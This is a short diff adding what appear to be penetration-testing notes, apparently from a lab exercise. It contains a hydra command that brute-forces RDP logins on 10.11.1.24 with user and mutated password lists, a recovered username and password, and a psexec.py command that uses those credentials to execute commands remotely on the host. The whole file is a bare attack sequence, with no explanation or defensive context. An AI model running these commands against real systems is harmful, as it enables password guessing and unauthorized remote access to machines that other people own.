@@ -1,0 +1,6 @@
+hydra -t 1 -V -f -L users.txt -P passwordsmutated.txt rdp://10.11.1.24
+
+user: brett
+password: ThisIsTheUsersPassword15
+
+psexec.py brett:ThisIsTheUsersPassword15@10.11.1.24
